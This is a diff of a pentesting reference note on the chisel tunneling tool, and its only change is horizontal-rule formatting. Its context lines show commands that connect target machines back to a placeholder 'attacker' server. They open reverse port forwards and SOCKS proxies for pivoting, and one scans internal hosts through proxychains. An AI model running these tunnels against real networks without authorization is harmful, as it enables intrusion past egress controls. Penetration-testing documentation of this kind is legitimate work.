@@ -11,7 +11,7 @@ linked:
 > [!info]
 > TCP/UDP tunnel sobre HTTP con TLS, escrito en Go. Single binary cross-platform. Excelente para pivoting cuando solo HTTP/HTTPS está permitido outbound.
 
-***
+---
 
 ## Modo server (attacker)
 
@@ -20,7 +20,7 @@ linked:
 chisel server --reverse -p 8000
 ```
 
-***
+---
 
 ## Modo client (target)
 
@@ -35,7 +35,7 @@ chisel client http://attacker:8000 R:9999:127.0.0.1:3306
 chisel client http://attacker:8000 1080:socks
 ```
 
-***
+---
 
 ## Setup typical pivoting
 
@@ -62,7 +62,7 @@ chisel client http://attacker:8000 1080:socks
    proxychains nmap -sT -Pn -p 80,443 internal-target
    ```
 
-***
+---
 
 ## Encrypt + auth
 
@@ -74,7 +74,7 @@ chisel server --reverse -p 8000 --auth user:pass --tls-cert cert.pem --tls-key k
 chisel client --auth user:pass --fingerprint <fp> https://attacker:8000 R:socks
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
